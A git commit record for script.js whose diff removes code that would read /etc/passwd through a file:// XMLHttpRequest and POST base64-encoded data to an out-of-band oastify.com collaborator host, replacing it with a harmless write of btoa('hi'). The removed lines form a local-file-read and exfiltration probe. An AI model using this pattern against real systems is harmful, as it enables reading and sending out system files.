d94125c412b56fd294063252f19db2155feb2e47
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2023-10-26 20:39:45 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,9 +1,1 @@
-//var url="file:///etc/passwd"
-//var xhr=new XMLHttpRequest();
-//xhr.open("GET", url, false);
-//xhr.send();
-var resp=btoa('xxxxxxxxxxxxxxx');
-
-var xhr2=new XMLHttpRequest(); 
-xhr2.open("POST", 'http://7u2lw3lguypscnd7c1l7jbfk1b72vsjh.oastify.com/', false);
-xhr2.send(resp);
+document.write(btoa("hi"));
